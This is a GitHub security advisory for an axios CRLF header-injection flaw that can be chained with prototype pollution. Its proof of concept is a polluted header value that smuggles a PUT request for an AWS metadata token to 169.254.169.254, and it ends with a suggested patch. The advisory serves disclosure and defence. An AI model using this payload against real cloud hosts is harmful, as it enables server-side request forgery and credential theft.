# [M] Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain

## Summary
Severity: Medium
Advisory: GHSA-fvcv-3m26-pcqx
CVE: CVE-2026-40175
CWE: CWE-113, CWE-444, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-fvcv-3m26-pcqx
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.0
- npm: `axios` — affected >=0 <0.31.0

## Details
# Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain

## Summary
The Axios library is vulnerable to a specific gadget-style attack chain in which **prototype pollution** in a third-party dependency may be leveraged to inject unsanitized header values into outbound requests.

Axios can be used as a gadget after pollution occurs elsewhere because header values merged from attacker-controlled prototype properties are not sanitized for CRLF (`\r\n`) characters before being written to the request. In affected deployments, this may enable limited request manipulation or metadata access as part of a higher-complexity exploit chain.

**Severity**: Moderate (CVSS 3.1 Base Score: 4.8)
**Affected Versions**: All versions (v0.x - v1.x)
**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)

## Usage of \"Helper\" Vulnerabilities
This issue requires a separate **prototype pollution** vulnerability in another library in the application stack (for example, `qs`, `minimist`, `ini`, or `body-parser`). If an attacker can pollute `Object.prototype`, Axios may pick up the polluted properties during config merge.

Because Axios does not sanitise these merged header values for CRLF (`\r\n`) characters, the polluted property can alter the structure of an outbound HTTP request.

## Proof of Concept

### 1. The Setup (Simulated Pollution)
Imagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:
```javascript
Object.prototype['x-amz-target'] = \"dummy\r\n\r\nPUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\nGET /ignore\";
```

### 2. The Gadget Trigger (Safe Code)
The application makes a completely safe, hardcoded request:
```javascript
// This looks safe to the developer
await axios.get('https://analytics.internal/pings'); 
```

### 3. The Execution
Axios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.

**Resulting HTTP traffic:**
```http
GET /pings HTTP/1.1
Host: analytics.internal
x-amz-target: dummy

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET /ignore HTTP/1.1
...
```

### 4. The Impact
In environments where requests can reach cloud metadata endpoints or sensitive internal services, the injected header content may help bypass expected request constraints and expose limited credentials or modify request semantics. This impact depends on application context and a separate prototype-pollution primitive.

## Impact Analysis
-   **Confidentiality**: May expose limited sensitive information in affected network environments.
-   **Integrity**: May allow modification of outbound request structure or injected headers.
-   **Attack Complexity**: Exploitation requires a separate prototype-pollution vulnerability and a reachable target service.

## Recommended Fix
Validate all header values in `lib/adapters/http.js` and `xhr.js` before passing them to the underlying request function.

**Patch Suggestion:**
```javascript
// In lib/adapters/http.js
utils.forEach(requestHeaders, function setRequestHeader(val, key) {
  if (/[\r\n]/.test(val)) {
    throw new Error('Security: Header value contains invalid characters');
  }
  // ... proceed to set header
});
```

## References
-   **OWASP**: CRLF Injection (CWE-113)

This report was generated as part of a security audit of the Axios library.

## References
- https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx
- https://nvd.nist.gov/vuln/detail/CVE-2026-40175
- https://github.com/axios/axios/pull/10660
- https://github.com/axios/axios/pull/10660#issuecomment-4224168081
- https://github.com/axios/axios/pull/10688
- https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c
- https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1
- https://cert-portal.siemens.com/productcert/html/ssa-876049.html
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v0.31.0
- https://github.com/axios/axios/releases/tag/v1.15.0
